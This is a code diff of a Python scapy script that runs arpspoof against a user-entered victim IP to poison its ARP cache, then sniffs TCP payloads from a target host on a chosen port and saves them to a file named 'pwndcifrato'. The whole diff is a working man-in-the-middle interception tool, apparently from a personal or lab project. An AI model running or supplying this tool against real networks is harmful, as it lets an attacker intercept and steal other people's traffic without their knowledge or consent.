@@ -5,26 +5,25 @@ from scapy.layers.inet import TCP
 from helpers.utils import *
 import os
 
-def arpoisoner(out_lck):
+def arpoisoner(out_lck, myAddress):
 
     output(out_lck, "Arp Poisoner")
 
-    victimip = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")
+    victimIP = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")
 
-    gatewayip = loop_input(out_lck, "Please insert target IP: ")
-
-    os.system("xterm -e \"arpspoof -i %s -t %s  scapy%s\"" % ("enx9cebe811a79a", "192.168." + victimip, "192.168." + gatewayip))
+    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % ("enx9cebe811a79a", "192.168." + victimIP, myAddress))
 
 
-def lel(array, out_lck):
+def lel(array):
 
     def out_sniff(packet):
         array.append(bytes(packet[TCP].payload))
     return out_sniff
 
 
-def analyzer(out_lck):
-    file = open("received/pwndcifrato.txt", "wb")
+def analyzer(out_lck, port, extension):
+
+    file = open("sniffed/pwndcifrato." + extension, "wb")
 
     output(out_lck, "Analizer")
 
@@ -34,7 +33,7 @@ def analyzer(out_lck):
 
     array = []
     result = []
-    sniff(filter="tcp and port 60000 and host %s" % ("192.168." + destination), timeout=time, prn=lel(array, out_lck))
+    sniff(filter="tcp and port %s and host %s" % (port, "192.168." + destination), timeout=time, prn=lel(array))
     for idx, el in enumerate(array):
         if el not in result:
             result.append(el)
